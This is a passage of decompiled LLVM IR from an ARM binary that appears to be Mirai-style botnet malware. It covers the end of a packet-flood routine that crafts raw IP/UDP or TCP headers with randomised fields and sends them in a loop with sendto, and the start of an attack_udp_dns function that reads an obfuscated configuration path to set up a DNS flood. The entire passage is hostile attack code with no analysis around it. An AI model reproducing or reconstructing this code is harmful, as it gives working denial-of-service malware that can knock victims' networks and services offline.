  %v3_d41c = load i32, i32* @lr, align 4
  %v4_d41c = add i32 %v3_d41c, 6
  %v5_d41c = inttoptr i32 %v4_d41c to i16*
  store i16 64, i16* %v5_d41c, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d374, %bb
  %v2_d420 = load i32, i32* @global_var_26e50.101, align 4
  %v1_d424 = load i32, i32* @lr, align 4
  %v2_d424 = add i32 %v1_d424, 12
  %v3_d424 = inttoptr i32 %v2_d424 to i32*
  store i32 %v2_d420, i32* %v3_d424, align 4
  store i32 %v2_d390, i32* %r2.global-to-local, align 4
  %v1_d42c = add i32 %v2_d390, 16
  %v2_d42c = inttoptr i32 %v1_d42c to i32*
  %v3_d42c = load i32, i32* %v2_d42c, align 4
  %v1_d430 = load i32, i32* @lr, align 4
  %v2_d430 = add i32 %v1_d430, 16
  %v3_d430 = inttoptr i32 %v2_d430 to i32*
  store i32 %v3_d42c, i32* %v3_d430, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_d438 = load i32, i32* @lr, align 4
  %v1_d438 = add i32 %v0_d438, 20
  store i32 %v1_d438, i32* %r4.global-to-local, align 4
  %v2_d43c = add i32 %v0_d438, 28
  %v3_d43c = inttoptr i32 %v2_d43c to i32*
  store i32 -1, i32* %v3_d43c, align 4
  %v0_d440 = load i32, i32* @r5, align 4
  %v1_d440 = trunc i32 %v0_d440 to i16
  %v2_d440 = load i32, i32* @lr, align 4
  %v3_d440 = add i32 %v2_d440, 4
  %v4_d440 = inttoptr i32 %v3_d440 to i16*
  store i16 %v1_d440, i16* %v4_d440, align 2
  %v0_d444 = load i32, i32* @lr, align 4
  %v1_d444 = add i32 %v0_d444, 32
  %v0_d448 = load i32, i32* %ip.global-to-local, align 4
  %v1_d448 = trunc i32 %v0_d448 to i16
  %v2_d448 = load i32, i32* %r4.global-to-local, align 4
  %v3_d448 = add i32 %v2_d448, 4
  %v4_d448 = inttoptr i32 %v3_d448 to i16*
  store i16 %v1_d448, i16* %v4_d448, align 2
  %v0_d44c = load i32, i32* @r7, align 4
  %v1_d44c = trunc i32 %v0_d44c to i16
  %v2_d44c = load i32, i32* %r4.global-to-local, align 4
  %v3_d44c = add i32 %v2_d44c, 2
  %v4_d44c = inttoptr i32 %v3_d44c to i16*
  store i16 %v1_d44c, i16* %v4_d44c, align 2
  %v0_d450 = load i32, i32* @r6, align 4
  %v1_d450 = trunc i32 %v0_d450 to i16
  %v2_d450 = load i32, i32* @lr, align 4
  %v3_d450 = add i32 %v2_d450, 20
  %v4_d450 = inttoptr i32 %v3_d450 to i16*
  store i16 %v1_d450, i16* %v4_d450, align 2
  %v3_d454 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d454, i32* %r2.global-to-local, align 4
  %v3_d458 = call i32 @util_memcpy(i32 %v1_d444, i32 %v3_d2cc, i32 %v3_d454)
  %v3_d45c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d45c, i32* %r3.global-to-local, align 4
  %v1_d460 = add i32 %v3_d45c, 1
  store i32 %v1_d460, i32* @r4, align 4
  %v1_d464 = load i32, i32* @r8, align 4
  %v9_d464 = icmp eq i32 %v1_d460, %v1_d464
  store i1 %v9_d464, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d460, i32* %stack_var_-44, align 4
  %v5_d46c = icmp slt i32 %v1_d460, %v1_d464
  br i1 %v5_d46c, label %dec_label_pc_d374, label %dec_label_pc_d470.preheader

dec_label_pc_d470.preheader:                      ; preds = %.thread, %dec_label_pc_d318
  %v0_d474.ph = phi i32 [ 0, %dec_label_pc_d318 ], [ %v1_d464, %.thread ]
  %v3_d4b0 = icmp eq i32 %v3_d328, 65535
  br label %dec_label_pc_d470

dec_label_pc_d470:                                ; preds = %dec_label_pc_d470, %dec_label_pc_d55c, %dec_label_pc_d470.preheader
  %v0_d474 = phi i32 [ %v0_d474.ph, %dec_label_pc_d470.preheader ], [ 0, %dec_label_pc_d55c ], [ 0, %dec_label_pc_d470 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d474 = icmp eq i32 %v0_d474, 0
  store i1 %v2_d474, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d474, label %dec_label_pc_d470, label %dec_label_pc_d480

dec_label_pc_d480:                                ; preds = %dec_label_pc_d470, %dec_label_pc_d55c
  br label %dec_label_pc_d484

dec_label_pc_d484:                                ; preds = %dec_label_pc_d4d0, %dec_label_pc_d480
  %v1_d494 = phi i32 [ %v1_d54c, %dec_label_pc_d4d0 ], [ 0, %dec_label_pc_d480 ]
  %v5_d488 = mul i32 %v1_d494, 24
  %v1_d48c = load i32, i32* @sl, align 4
  %v2_d48c = add i32 %v1_d48c, %v5_d488
  store i32 %v2_d48c, i32* %r3.global-to-local, align 4
  %v1_d490 = add i32 %v2_d48c, 20
  %v2_d490 = inttoptr i32 %v1_d490 to i8*
  %v3_d490 = load i8, i8* %v2_d490, align 1
  %v4_d490 = zext i8 %v3_d490 to i32
  store i32 %v4_d490, i32* %r2.global-to-local, align 4
  %v0_d494 = load i32, i32* @fp, align 4
  %v4_d494 = mul i32 %v1_d494, 4
  %v5_d494 = add i32 %v0_d494, %v4_d494
  %v6_d494 = inttoptr i32 %v5_d494 to i32*
  %v7_d494 = load i32, i32* %v6_d494, align 4
  store i32 %v7_d494, i32* @r5, align 4
  %v7_d49c = icmp eq i8 %v3_d490, 31
  store i1 %v7_d49c, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_d4a4 = add i32 %v7_d494, 20
  store i32 %v1_d4a4, i32* @r6, align 4
  %tmp40 = icmp ult i8 %v3_d490, 32
  br i1 %tmp40, label %dec_label_pc_d570, label %dec_label_pc_d4ac

dec_label_pc_d4ac:                                ; preds = %dec_label_pc_d484
  store i32 %v3_d328, i32* %r3.global-to-local, align 4
  store i1 %v3_d4b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_d4b0, label %dec_label_pc_d5d0, label %dec_label_pc_d4b8

dec_label_pc_d4b8:                                ; preds = %dec_label_pc_d570, %dec_label_pc_d4ac
  %v1_d4bc = phi i32 [ %v1_d5c8, %dec_label_pc_d570 ], [ 65535, %dec_label_pc_d4ac ]
  store i32 %v3_d32c, i32* %ip.global-to-local, align 4
  %v9_d4bc = icmp eq i32 %v3_d32c, %v1_d4bc
  store i1 %v9_d4bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d4bc, label %dec_label_pc_d5e4, label %dec_label_pc_d4c4

dec_label_pc_d4c4:                                ; preds = %dec_label_pc_d5d0.dec_label_pc_d4c4_crit_edge, %dec_label_pc_d4b8
  %v1_d4c8 = phi i32 [ %v1_d4c8.pre, %dec_label_pc_d5d0.dec_label_pc_d4c4_crit_edge ], [ %v1_d4bc, %dec_label_pc_d4b8 ]
  %v9_d4c8 = icmp eq i32 %v3_d330, %v1_d4c8
  store i1 %v9_d4c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d4c8, label %dec_label_pc_d5f8, label %dec_label_pc_d4d0

dec_label_pc_d4d0:                                ; preds = %dec_label_pc_d5e4, %dec_label_pc_d4c4, %dec_label_pc_d5f8
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_d4d4 = load i32, i32* @r5, align 4
  %v3_d4d4 = add i32 %v2_d4d4, 10
  %v4_d4d4 = inttoptr i32 %v3_d4d4 to i16*
  store i16 0, i16* %v4_d4d4, align 2
  %v0_d4dc = load i32, i32* @r5, align 4
  store i32 %v0_d4dc, i32* @r0, align 4
  %v2_d4e0 = call i32 @checksum_generic(i32 %v0_d4dc, i32 20)
  %v3_d4e0 = trunc i32 %v2_d4e0 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d4e8 = load i32, i32* @r5, align 4
  %v4_d4e8 = add i32 %v3_d4e8, 10
  %v5_d4e8 = inttoptr i32 %v4_d4e8 to i16*
  store i16 %v3_d4e0, i16* %v5_d4e8, align 2
  %v0_d4ec = load i32, i32* %r3.global-to-local, align 4
  %v1_d4ec = trunc i32 %v0_d4ec to i16
  %v2_d4ec = load i32, i32* @r6, align 4
  %v3_d4ec = add i32 %v2_d4ec, 6
  %v4_d4ec = inttoptr i32 %v3_d4ec to i16*
  store i16 %v1_d4ec, i16* %v4_d4ec, align 2
  %v3_d4f0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d4f0, i32* %r3.global-to-local, align 4
  %v0_d4f4 = load i32, i32* @r6, align 4
  store i32 %v0_d4f4, i32* @r1, align 4
  %v1_d4f8 = add i32 %v0_d4f4, 4
  %v2_d4f8 = inttoptr i32 %v1_d4f8 to i16*
  %v3_d4f8 = load i16, i16* %v2_d4f8, align 2
  %v4_d4f8 = zext i16 %v3_d4f8 to i32
  store i32 %v4_d4f8, i32* %r2.global-to-local, align 4
  %v1_d4fc = add i32 %v3_d4f0, 12
  store i32 %v1_d4fc, i32* %r3.global-to-local, align 4
  %v0_d500 = load i32, i32* @r5, align 4
  %v4_d504 = call i32 @checksum_tcpudp(i32 %v0_d500, i32 %v0_d4f4, i32 %v4_d4f8, i32 %v1_d4fc)
  %v5_d504 = trunc i32 %v4_d504 to i16
  %v3_d508 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d508, i32* %r3.global-to-local, align 4
  %v3_d50c = mul i32 %v3_d508, 32
  store i32 %v3_d50c, i32* %lr.global-to-local, align 4
  %v3_d510 = load i32, i32* @r6, align 4
  %v4_d510 = add i32 %v3_d510, 6
  %v5_d510 = inttoptr i32 %v4_d510 to i16*
  store i16 %v5_d504, i16* %v5_d510, align 2
  %v0_d514 = load i32, i32* %lr.global-to-local, align 4
  %v1_d514 = load i32, i32* %r3.global-to-local, align 4
  %tmp41 = mul i32 %v1_d514, -8
  %v5_d514 = add i32 %v0_d514, %tmp41
  store i32 %v5_d514, i32* %lr.global-to-local, align 4
  %v0_d518 = load i32, i32* @r6, align 4
  %v1_d518 = add i32 %v0_d518, 2
  %v2_d518 = inttoptr i32 %v1_d518 to i16*
  %v3_d518 = load i16, i16* %v2_d518, align 2
  %v4_d518 = zext i16 %v3_d518 to i32
  store i32 %v4_d518, i32* @r6, align 4
  %v3_d51c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d51c, i32* %r2.global-to-local, align 4
  %v1_d520 = load i32, i32* @sl, align 4
  %v2_d520 = add i32 %v1_d520, %v5_d514
  store i32 %v2_d520, i32* @lr, align 4
  %v3_d524 = add i32 %v2_d520, 2
  %v4_d524 = inttoptr i32 %v3_d524 to i16*
  store i16 %v3_d518, i16* %v4_d524, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_d530 = load i32, i32* @r5, align 4
  %v0_d534 = load i32, i32* %r2.global-to-local, align 4
  %v1_d534 = add i32 %v0_d534, 32
  store i32 %v1_d534, i32* %r2.global-to-local, align 4
  %v0_d538 = load i32, i32* @sb, align 4
  %v0_d53c = load i32, i32* @lr, align 4
  %v6_d544 = call i32 @__libc_sendto(i32 %v0_d538, i32 %v0_d530, i32 %v1_d534, i32 16384, i32 %v0_d53c, i32 16)
  %v3_d548 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d548, i32* %r3.global-to-local, align 4
  %v1_d54c = add i32 %v3_d548, 1
  %v1_d550 = load i32, i32* @r8, align 4
  %v9_d550 = icmp eq i32 %v1_d54c, %v1_d550
  store i1 %v9_d550, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d54c, i32* %stack_var_-44, align 4
  %v5_d558 = icmp slt i32 %v1_d54c, %v1_d550
  br i1 %v5_d558, label %dec_label_pc_d484, label %dec_label_pc_d55c

dec_label_pc_d55c:                                ; preds = %dec_label_pc_d4d0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d560 = icmp eq i32 %v1_d550, 0
  store i1 %v2_d560, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d560, label %dec_label_pc_d470, label %dec_label_pc_d480

dec_label_pc_d570:                                ; preds = %dec_label_pc_d484
  %v1_d570 = add i32 %v2_d48c, 16
  %v2_d570 = inttoptr i32 %v1_d570 to i32*
  %v3_d570 = load i32, i32* %v2_d570, align 4
  store i32 %v3_d570, i32* @r4, align 4
  %v0_d574 = call i32 @rand_next()
  %v3_d578 = load i32, i32* %stack_var_-44, align 4
  %v5_d580 = mul i32 %v3_d578, 24
  %v0_d584 = load i32, i32* @r4, align 4
  %v1_d584 = and i32 %v0_d584, 16711680
  store i32 %v1_d584, i32* %ip.global-to-local, align 4
  %v3_d588 = udiv i32 %v0_d584, 16777216
  %v4_d58c = udiv i32 %v1_d584, 256
  %v5_d58c = or i32 %v4_d58c, %v3_d588
  store i32 %v5_d58c, i32* %r2.global-to-local, align 4
  %v1_d590 = load i32, i32* @sl, align 4
  %v2_d590 = add i32 %v1_d590, %v5_d580
  %v1_d594 = and i32 %v0_d584, 65280
  store i32 %v1_d594, i32* %r3.global-to-local, align 4
  %v1_d598 = add i32 %v2_d590, 20
  %v2_d598 = inttoptr i32 %v1_d598 to i8*
  %v3_d598 = load i8, i8* %v2_d598, align 1
  %v4_d598 = zext i8 %v3_d598 to i32
  store i32 %v4_d598, i32* %ip.global-to-local, align 4
  %v5_d5a0 = call i32 @llvm.bswap.i32(i32 %v0_d584)
  %v7_d5a4 = lshr i32 %v0_d574, %v4_d598
  %v8_d5a4 = add i32 %v7_d5a4, %v5_d5a0
  store i32 %v8_d5a4, i32* %r2.global-to-local, align 4
  %v5_d5bc = call i32 @llvm.bswap.i32(i32 %v8_d5a4)
  %v1_d5c0 = load i32, i32* @r5, align 4
  %v2_d5c0 = add i32 %v1_d5c0, 16
  %v3_d5c0 = inttoptr i32 %v2_d5c0 to i32*
  store i32 %v5_d5bc, i32* %v3_d5c0, align 4
  store i32 %v3_d328, i32* %r3.global-to-local, align 4
  %v1_d5c8 = load i32, i32* @r7, align 4
  %v9_d5c8 = icmp eq i32 %v3_d328, %v1_d5c8
  store i1 %v9_d5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d5c8, label %dec_label_pc_d5d0, label %dec_label_pc_d4b8

dec_label_pc_d5d0:                                ; preds = %dec_label_pc_d570, %dec_label_pc_d4ac
  %v0_d5d0 = call i32 @rand_next()
  %v1_d5d0 = trunc i32 %v0_d5d0 to i16
  store i32 %v3_d32c, i32* %ip.global-to-local, align 4
  %v1_d5d8 = load i32, i32* @r7, align 4
  %v9_d5d8 = icmp eq i32 %v3_d32c, %v1_d5d8
  store i1 %v9_d5d8, i1* %cpsr_z.global-to-local, align 1
  %v3_d5dc = load i32, i32* @r5, align 4
  %v4_d5dc = add i32 %v3_d5dc, 4
  %v5_d5dc = inttoptr i32 %v4_d5dc to i16*
  store i16 %v1_d5d0, i16* %v5_d5dc, align 2
  br i1 %v9_d5d8, label %dec_label_pc_d5e4, label %dec_label_pc_d5d0.dec_label_pc_d4c4_crit_edge

dec_label_pc_d5d0.dec_label_pc_d4c4_crit_edge:    ; preds = %dec_label_pc_d5d0
  %v1_d4c8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d4c4

dec_label_pc_d5e4:                                ; preds = %dec_label_pc_d5d0, %dec_label_pc_d4b8
  %v0_d5e4 = call i32 @rand_next()
  %v1_d5e4 = trunc i32 %v0_d5e4 to i16
  %v1_d5ec = load i32, i32* @r7, align 4
  %v9_d5ec = icmp eq i32 %v3_d330, %v1_d5ec
  store i1 %v9_d5ec, i1* %cpsr_z.global-to-local, align 1
  %v3_d5f0 = load i32, i32* @r5, align 4
  %v4_d5f0 = add i32 %v3_d5f0, 20
  %v5_d5f0 = inttoptr i32 %v4_d5f0 to i16*
  store i16 %v1_d5e4, i16* %v5_d5f0, align 2
  br i1 %v9_d5ec, label %dec_label_pc_d5f8, label %dec_label_pc_d4d0

dec_label_pc_d5f8:                                ; preds = %dec_label_pc_d5e4, %dec_label_pc_d4c4
  %v0_d5f8 = call i32 @rand_next()
  %v1_d5f8 = trunc i32 %v0_d5f8 to i16
  %v3_d5fc = load i32, i32* @r6, align 4
  %v4_d5fc = add i32 %v3_d5fc, 2
  %v5_d5fc = inttoptr i32 %v4_d5fc to i16*
  store i16 %v1_d5f8, i16* %v5_d5fc, align 2
  br label %dec_label_pc_d4d0

dec_label_pc_d604:                                ; preds = %dec_label_pc_d2f0
  %v0_d604 = load i32, i32* @sb, align 4
  %v1_d608 = call i32 @__GI___libc_close(i32 %v0_d604)
  br label %dec_label_pc_d60c

dec_label_pc_d60c:                                ; preds = %entry, %dec_label_pc_d604
  %v1_d614 = phi i32 [ %v3_d2e0, %entry ], [ %v1_d608, %dec_label_pc_d604 ]
  store i32 %v3_d1e4, i32* %r4.global-to-local, align 4
  store i32 %v27_d1e4, i32* %lr.global-to-local, align 4
  ret i32 %v1_d614

; uselistorder directives
  uselistorder i32 %v1_d5c8, { 1, 0 }
  uselistorder i32 %v0_d584, { 1, 2, 0, 3 }
  uselistorder i32 %v1_d54c, { 2, 0, 3, 1 }
  uselistorder i32 %v5_d514, { 1, 0 }
  uselistorder i1 %v3_d4b0, { 1, 0 }
  uselistorder i32 %v1_d460, { 1, 0, 2, 3 }
  uselistorder i32 %v3_d3c8, { 1, 0 }
  uselistorder i32 %v3_d360, { 1, 0 }
  uselistorder i32 %v3_d35c, { 1, 0 }
  uselistorder i32 %v0_d320, { 1, 0, 3, 2 }
  uselistorder i32 %v0_d31c, { 1, 0, 2 }
  uselistorder i32 %v0_d318, { 1, 0, 3, 2 }
  uselistorder i1 %v7_d310, { 1, 0 }
  uselistorder i1 %v7_d2e4, { 1, 0 }
  uselistorder i32 %v3_d2e0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_d280, { 1, 0 }
  uselistorder i32 %v5_d254, { 1, 0 }
  uselistorder i32 %v5_d218, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_d60c, { 1, 0 }
  uselistorder label %dec_label_pc_d4d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d480, { 1, 0 }
  uselistorder label %dec_label_pc_d470, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_d61c = load i32, i32* @sb, align 4
  %v27_d61c = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_d63c = call i32 @calloc(i32 %arg1, i32 4)
  %v0_d640 = load i32, i32* @r5, align 4
  store i32 %v0_d640, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d64c = load i32, i32* @r4, align 4
  store i32 %v0_d64c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_d654 = inttoptr i32 %v0_d640 to i32*
  %v6_d654 = call i32 @attack_get_opt_int(i32 %v0_d64c, i32* %v5_d654, i32 2, i32 0)
  %v1_d660 = urem i32 %v6_d654, 256
  store i32 %v1_d660, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d66c = load i32, i32* @r4, align 4
  store i32 %v0_d66c, i32* %r0.global-to-local, align 4
  %v0_d670 = load i32, i32* @r5, align 4
  store i32 %v0_d670, i32* %r1.global-to-local, align 4
  %v6_d678 = inttoptr i32 %v0_d670 to i32*
  %v7_d678 = call i32 @attack_get_opt_int(i32 %v0_d66c, i32* %v6_d678, i32 3, i32 65535)
  %v0_d67c = load i32, i32* @r5, align 4
  store i32 %v0_d67c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_d688 = load i32, i32* @r4, align 4
  store i32 %v0_d688, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_d690 = inttoptr i32 %v0_d67c to i32*
  %v6_d690 = call i32 @attack_get_opt_int(i32 %v0_d688, i32* %v5_d690, i32 4, i32 64)
  %v1_d698 = urem i32 %v6_d690, 256
  store i32 %v1_d698, i32* %ip.global-to-local, align 4
  %v0_d69c = load i32, i32* @r5, align 4
  store i32 %v0_d69c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d6a8 = load i32, i32* @r4, align 4
  store i32 %v0_d6a8, i32* %r0.global-to-local, align 4
  %v6_d6b0 = inttoptr i32 %v0_d69c to i32*
  %v7_d6b0 = call i32 @attack_get_opt_int(i32 %v0_d6a8, i32* %v6_d6b0, i32 5, i32 0)
  %v1_d6bc = urem i32 %v7_d6b0, 256
  store i32 %v1_d6bc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d6c8 = load i32, i32* @r4, align 4
  store i32 %v0_d6c8, i32* %r0.global-to-local, align 4
  %v0_d6cc = load i32, i32* @r5, align 4
  store i32 %v0_d6cc, i32* %r1.global-to-local, align 4
  %v5_d6d4 = inttoptr i32 %v0_d6cc to i32*
  %v6_d6d4 = call i32 @attack_get_opt_int(i32 %v0_d6c8, i32* %v5_d6d4, i32 6, i32 65535)
  %v0_d6d8 = load i32, i32* @r5, align 4
  store i32 %v0_d6d8, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_d6e4 = load i32, i32* @r4, align 4
  store i32 %v0_d6e4, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_d6ec = inttoptr i32 %v0_d6d8 to i32*
  %v6_d6ec = call i32 @attack_get_opt_int(i32 %v0_d6e4, i32* %v5_d6ec, i32 7, i32 53)
  %v0_d6f8 = load i32, i32* @r5, align 4
  store i32 %v0_d6f8, i32* %r1.global-to-local, align 4
  %v0_d6fc = load i32, i32* @r4, align 4
  store i32 %v0_d6fc, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_d708 = inttoptr i32 %v0_d6f8 to i32*
  %v6_d708 = call i32 @attack_get_opt_int(i32 %v0_d6fc, i32* %v5_d708, i32 9, i32 65535)
  %v0_d70c = load i32, i32* @r5, align 4
  store i32 %v0_d70c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_d718 = load i32, i32* @r4, align 4
  store i32 %v0_d718, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_d720 = inttoptr i32 %v0_d70c to i32*
  %v6_d720 = call i32 @attack_get_opt_int(i32 %v0_d718, i32* %v5_d720, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d72c = load i32, i32* @r5, align 4
  store i32 %v0_d72c, i32* %r1.global-to-local, align 4
  store i32 %v6_d720, i32* %sb.global-to-local, align 4
  %v0_d734 = load i32, i32* @r4, align 4
  store i32 %v0_d734, i32* %r0.global-to-local, align 4
  %v5_d738 = inttoptr i32 %v0_d72c to i32*
  %v6_d738 = call i32 @attack_get_opt_str(i32 %v0_d734, i32* %v5_d738, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_d738, i32* @r7, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_d744 = call i32 @table_unlock_val(i32 30)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v3_d750 = call i32 @table_retrieve_val(i32 30, i32* null)
  store i32 %v3_d750, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d758 = call i32 @__libc_open(i32 %v3_d750, i32 0)
  store i32 %v2_d758, i32* @r4, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_d764 = call i32 @table_lock_val(i32 30)
  store i32 %v1_d764, i32* %r0.global-to-local, align 4
  %v0_d768 = load i32, i32* @r4, align 4
  %v1_d768 = icmp slt i32 %v0_d768, 0
  %v2_d768 = icmp eq i32 %v0_d768, 0
  store i1 %v2_d768, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_d768, label %dec_label_pc_dc64, label %dec_label_pc_d770

dec_label_pc_d770:                                ; preds = %entry
  %v2_d774 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_d774, i32* @sl, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_d774, i32* @r1, align 4
  store i32 %v0_d768, i32* %r0.global-to-local, align 4
  %v1_d784 = call i32 @__libc_read(i32 %v0_d768)
  store i32 %v1_d784, i32* @r5, align 4
  %v0_d78c = load i32, i32* @r4, align 4
  store i32 %v0_d78c, i32* %r0.global-to-local, align 4
  %v1_d790 = call i32 @__GI___libc_close(i32 %v0_d78c)
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_d798 = call i32 @table_unlock_val(i32 31)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v3_d7a4 = call i32 @table_retrieve_val(i32 31, i32* null)
  %v0_d7a8 = load i32, i32* @r5, align 4
  store i32 %v0_d7a8, i32* @r1, align 4
  store i32 %v3_d7a4, i32* %r2.global-to-local, align 4
  store i32 %v2_d774, i32* %r0.global-to-local, align 4
  %v3_d7b4 = bitcast i32* %stack_var_-2124 to i8*
  %v4_d7b4 = call i32 @util_stristr(i8* %v3_d7b4, i32 %v0_d7a8, i32 %v3_d7a4)
  store i32 %v4_d7b4, i32* @r6, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_d7c0 = call i32 @table_lock_val(i32 31)
  store i32 %v1_d7c0, i32* %r0.global-to-local, align 4
  %v0_d7c4 = load i32, i32* @r6, align 4
  %v7_d7c4 = icmp eq i32 %v0_d7c4, -1
  store i1 %v7_d7c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d7c4, label %dec_label_pc_dc64, label %dec_label_pc_d7cc

dec_label_pc_d7cc:                                ; preds = %dec_label_pc_d770
  %v0_d7cc = load i32, i32* @r5, align 4
  %v9_d7cc = icmp eq i32 %v0_d7cc, %v0_d7c4
  store i1 %v9_d7cc, i1* %cpsr_z.global-to-local, align 1
  %v7_d7d0 = icmp sgt i32 %v0_d7cc, %v0_d7c4
  br i1 %v7_d7d0, label %dec_label_pc_d7d4, label %dec_label_pc_dc64

dec_label_pc_d7d4:                                ; preds = %dec_label_pc_d7cc
  %v0_d7d4 = load i32, i32* @sl, align 4
  %v2_d7d4 = add i32 %v0_d7d4, %v0_d7c4
  store i32 %v2_d7d4, i32* %r1.global-to-local, align 4
  store i32 %v0_d7c4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_d800 = add i32 %v0_d7cc, -1
  br label %dec_label_pc_d7f8

dec_label_pc_d7e4:                                ; preds = %dec_label_pc_d820, %bb104
  %v9_d7e4 = icmp eq i32 %v1_d800, %v0_d7ec
  store i1 %v9_d7e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d7e4, label %dec_label_pc_d830, label %dec_label_pc_d7ec

dec_label_pc_d7ec:                                ; preds = %dec_label_pc_d810, %dec_label_pc_d7e4, %bb
  %v0_d81c29 = phi i32 [ %v0_d81c, %dec_label_pc_d810 ], [ %v0_d81c30, %dec_label_pc_d7e4 ], [ %v0_d81c, %bb ]
  %v0_d7fc25 = phi i32 [ 0, %dec_label_pc_d810 ], [ %v0_d7fc26, %dec_label_pc_d7e4 ], [ 0, %bb ]
  %v1_d7ec = add i32 %v0_d7ec, 1
  store i32 %v1_d7ec, i32* %r2.global-to-local, align 4
  %v9_d7f0 = icmp eq i32 %v1_d7ec, %v0_d7cc
  store i1 %v9_d7f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d7f0, label %dec_label_pc_dc64, label %dec_label_pc_d7f8

dec_label_pc_d7f8:                                ; preds = %dec_label_pc_d7ec, %dec_label_pc_d7d4
  %v0_d7ec = phi i32 [ %v1_d7ec, %dec_label_pc_d7ec ], [ %v0_d7c4, %dec_label_pc_d7d4 ]
